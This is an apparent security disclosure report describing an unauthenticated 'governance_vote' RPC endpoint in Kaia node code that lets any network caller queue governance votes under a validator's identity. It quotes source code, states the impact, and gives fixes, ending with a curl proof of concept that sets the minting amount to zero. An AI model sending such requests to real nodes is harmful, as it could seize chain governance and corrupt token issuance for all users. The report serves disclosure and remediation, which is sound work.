### Title
Unauthenticated `governance_vote` RPC Endpoint Allows Any Network-Reachable Caller to Inject Governance Parameter Changes on Behalf of a Validator Node — (`kaiax/gov/headergov/impl/api.go`)

### Summary

The `governance_vote` JSON-RPC method is registered with `Public: true` under the `governance` namespace and performs no caller-identity check. The handler unconditionally uses the node's own address (`api.h.nodeAddress`) as the voter, so any unauthenticated HTTP client that can reach the node's RPC port can enqueue a governance vote that will be written into the next block header the node proposes. Depending on governance mode, this allows an attacker to inject votes that change `reward.mintingamount`, `governance.governingnode`, `governance.addvalidator`/`removevalidator`, `governance.unitprice`, and other chain-wide parameters.

### Finding Description

**Root cause — `kaiax/gov/headergov/impl/api.go`, `Vote()` (lines 53–82):**

```go
func (api *headerGovAPI) Vote(name string, value any) (string, error) {
    var (
        voter     = api.h.nodeAddress          // ← always the node's own key; caller is never checked
        nextBlock = api.h.Chain.CurrentBlock().NumberU64() + 1
        gp        = api.h.GetParamSet(nextBlock)
        gMode     = gp.GovernanceMode
    )

    if gMode == "single" && voter != gp.GoverningNode {
        return "", ErrVotePermissionDenied
    }
    ...
    api.h.PushMyVotes(vote)   // ← vote queued; written to header.Vote on next proposal
    return "...", nil
}
```

The function never inspects the RPC caller's identity. The only guard (`gMode == "single" && voter != gp.GoverningNode`) tests whether the *node itself* is the governing node — not whether the *caller* is authorised. An attacker who can send an HTTP POST to the node's RPC port passes this check silently whenever the node is the governing node (single mode) or any council member (none mode).

**API registration — `kaiax/gov/headergov/impl/api.go` (lines 13–21):**

```go
func (h *headerGovModule) APIs() []rpc.API {
    return []rpc.API{{
        Namespace: "governance",
        Version:   "1.0",
        Service:   NewHeaderGovAPI(h),
        Public:    true,          // ← exposed over HTTP when governance namespace is enabled
    }}
}
```

**HTTP exposure logic — `networks/rpc/endpoints.go` (line 47):**

```go
if !api.IPCOnly && (whitelist[api.Namespace] || (len(whitelist) == 0 && api.Public)) {
```

When the operator starts the node with `--http.api governance,...` (standard for a governing-node operator), or when no module whitelist is set (all `Public: true` APIs are served), `governance_vote` is reachable over plain HTTP with no authentication.

**Vote lifecycle — `kaiax/gov/headergov/impl/execution.go` (lines 44–54):**

Once `PushMyVotes` stores the vote in `h.myVotes`, `PrepareHeader` writes it into `header.Vote` the next time the node proposes a block. `VerifyHeader` on other nodes then accepts it because the voter *is* the block proposer and *is* in the council — both checks pass legitimately. The vote is ratified at the epoch boundary and takes effect from the next epoch.

There is no API to cancel or inspect pending `myVotes` before they are committed to a block, and no mechanism to distinguish a vote placed by the operator from one placed by an attacker.

### Impact Explanation

An attacker who can send one unauthenticated HTTP request to a governing node's RPC port can:

- **Change `reward.mintingamount`** — inflate or zero out per-block KAIA issuance, corrupting the token supply and all downstream reward distributions.
- **Change `governance.governingnode`** — transfer sole voting authority to an attacker-controlled address, permanently seizing governance.
- **Vote `governance.addvalidator` / `governance.removevalidator`** — alter the validator set, enabling censorship or consensus disruption.
- **Change `governance.unitprice`** — set gas price to 0 or an extreme value, breaking fee economics.

In `none` mode the attacker can race-condition the last vote in an epoch across any council member's node. In `single` mode a single request to the governing node is sufficient.

The corrupted value is the on-chain governance parameter written into `header.Governance` at the epoch block and persisted to the chain state, affecting every subsequent block.

### Likelihood Explanation

Governing nodes and public EN operators routinely expose the `governance` namespace over HTTP for operational tooling (the official documentation shows `curl http://localhost:8551` examples). Any attacker with network access to that port — including co-located cloud tenants, misconfigured firewall rules, or SSRF from a co-hosted service — can trigger the issue with a single JSON-RPC call and no credentials.

### Recommendation

1. **Change `Public: false`** for the `governance_vote` API registration so it is only accessible over IPC (local socket), matching the security posture of `personal_*` and `debug_*` APIs.
2. If HTTP exposure is required, add an explicit caller-identity check: compare the authenticated session identity (e.g., via HTTP Basic Auth or a token) against the node's configured operator address before enqueuing the vote.
3. Derive the voter address server-side from the node's signing key and reject any call that arrives over a non-IPC transport, consistent with how `admin_*` methods are handled.

### Proof of Concept

```bash
# Attacker sends one unauthenticated request to a governing node's HTTP RPC port.
# No credentials, no wallet, no on-chain transaction required.

curl -s http://<governing-node-ip>:8551 \
  -X POST -H 'Content-Type: application/json' \
  --data '{
    "jsonrpc":"2.0","id":1,
    "method":"governance_vote",
    "params":["reward.mintingamount", "0"]
  }'

# Expected (vulnerable) response:
# {"jsonrpc":"2.0","id":1,"result":"(kaiax) Your vote is prepared. It will be put
#  into the block header or applied when your node generates a block as a proposer."}

# The vote is now queued in the node's myVotes list.
# On the next block the node proposes, header.Vote = encode("reward.mintingamount", 0).
# At the next epoch boundary, reward.mintingamount is ratified as 0 on-chain.
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** kaiax/gov/headergov/impl/api.go (L13-21)
```go
func (h *headerGovModule) APIs() []rpc.API {
	return []rpc.API{
		{
			Namespace: "governance",
			Version:   "1.0",
			Service:   NewHeaderGovAPI(h),
			Public:    true,
		},
	}
```

**File:** kaiax/gov/headergov/impl/api.go (L53-82)
```go
func (api *headerGovAPI) Vote(name string, value any) (string, error) {
	var (
		voter     = api.h.nodeAddress
		nextBlock = api.h.Chain.CurrentBlock().NumberU64() + 1
		gp        = api.h.GetParamSet(nextBlock)
		gMode     = gp.GovernanceMode
	)

	if gMode == "single" && voter != gp.GoverningNode {
		return "", ErrVotePermissionDenied
	}

	vote := headergov.NewVoteData(voter, name, value)
	if vote == nil {
		return "", ErrInvalidKeyValue
	}

	if gov.DeprecatedAt(vote.Name(), api.h.ChainConfig.Rules(new(big.Int).SetUint64(nextBlock))) {
		return "", ErrDeprecatedVote
	}

	err := api.h.checkConsistency(nextBlock, vote)
	if err != nil {
		return "", err
	}

	// TODO-kaiax: add removevalidator vote check

	api.h.PushMyVotes(vote)
	return "(kaiax) Your vote is prepared. It will be put into the block header or applied when your node generates a block as a proposer. Note that your vote may be duplicate.", nil
```

**File:** networks/rpc/endpoints.go (L40-53)
```go
	// Register all the APIs exposed by the services
	handler := NewServer()
	for _, api := range apis {
		if api.Namespace == "klay" {
			api.Namespace = "kaia"
		}

		if !api.IPCOnly && (whitelist[api.Namespace] || (len(whitelist) == 0 && api.Public)) {
			if err := handler.RegisterName(api.Namespace, api.Service); err != nil {
				return nil, nil, err
			}
			logger.Debug("HTTP registered", "namespace", api.Namespace)
		}
	}
```

**File:** kaiax/gov/headergov/impl/execution.go (L44-54)
```go
func (h *headerGovModule) HandleVote(blockNum uint64, vote headergov.VoteData) error {
	// if governance vote (i.e., not validator vote), add to vote
	if _, ok := gov.Params[vote.Name()]; ok {
		h.AddVote(blockNum, vote)
		InsertVoteDataBlockNum(h.ChainKv, blockNum)
	}

	// if the vote was mine, remove it.
	h.removeMyVote(vote)

	return nil
```

**File:** kaiax/gov/headergov/impl/header.go (L59-109)
```go
// (2) integrity of the voter (the voter must be the block proposer),
// (3) the vote value must be consistent compared to the latest ParamSet.
func (h *headerGovModule) VerifyVote(header *types.Header) error {
	if len(header.Vote) == 0 {
		return nil
	}

	var (
		vb       headergov.VoteBytes = header.Vote
		blockNum                     = header.Number.Uint64()
	)

	vote, err := vb.ToVoteData()
	if err != nil {
		logger.Error("ToVoteData error", "num", blockNum, "vote", vb, "err", err)
		return err
	}

	if gov.DeprecatedAt(vote.Name(), h.ChainConfig.Rules(header.Number)) {
		logger.Error("Vote is deprecated", "num", blockNum, "name", vote.Name())
		return ErrDeprecatedVote
	}

	council, err := h.ValSet.GetCouncil(blockNum)
	if err != nil {
		return err
	}

	// check if the voter is in council
	if !slices.Contains(council, vote.Voter()) {
		return ErrInvalidKeyValue
	}

	// check if Voter is the block proposer.
	author, err := h.Chain.Sealer().Author(header)
	if err != nil {
		return err
	}
	if author != vote.Voter() {
		return ErrInvalidVoter
	}

	// In single mode, only the governing node can write header.Vote after Permissionless.
	params := h.GetParamSet(blockNum)
	if h.ChainConfig.IsPermissionlessForkEnabled(new(big.Int).SetUint64(blockNum)) &&
		params.GovernanceMode == "single" &&
		vote.Voter() != params.GoverningNode {
		return ErrVotePermissionDenied
	}

	return h.checkConsistency(blockNum, vote)
```

**File:** kaiax/gov/param.go (L167-196)
```go
const (
	GovernanceDeriveShaImpl        ParamName = "governance.deriveshaimpl"
	GovernanceGovernanceMode       ParamName = "governance.governancemode"
	GovernanceGoverningNode        ParamName = "governance.governingnode"
	GovernanceGovParamContract     ParamName = "governance.govparamcontract"
	GovernanceUnitPrice            ParamName = "governance.unitprice"
	IstanbulCommitteeSize          ParamName = "istanbul.committeesize"
	IstanbulEpoch                  ParamName = "istanbul.epoch"
	IstanbulPolicy                 ParamName = "istanbul.policy"
	Kip71BaseFeeDenominator        ParamName = "kip71.basefeedenominator"
	Kip71GasTarget                 ParamName = "kip71.gastarget"
	Kip71LowerBoundBaseFee         ParamName = "kip71.lowerboundbasefee"
	Kip71MaxBlockGasUsedForBaseFee ParamName = "kip71.maxblockgasusedforbasefee"
	Kip71UpperBoundBaseFee         ParamName = "kip71.upperboundbasefee"
	RewardDeferredTxFee            ParamName = "reward.deferredtxfee"
	RewardKip82Ratio               ParamName = "reward.kip82ratio"
	RewardMintingAmount            ParamName = "reward.mintingamount"
	RewardMinimumStake             ParamName = "reward.minimumstake"
	RewardProposerUpdateInterval   ParamName = "reward.proposerupdateinterval"
	RewardRatio                    ParamName = "reward.ratio"
	RewardStakingRewardThreshold   ParamName = "reward.stakingrewardthreshold"
	RewardStakingUpdateInterval    ParamName = "reward.stakingupdateinterval"
	RewardUseFlexReward            ParamName = "reward.useflexreward"
	RewardUseGiniCoeff             ParamName = "reward.useginicoeff"
)

const (
	AddValidator    ParamName = "governance.addvalidator"
	RemoveValidator ParamName = "governance.removevalidator"
)
```
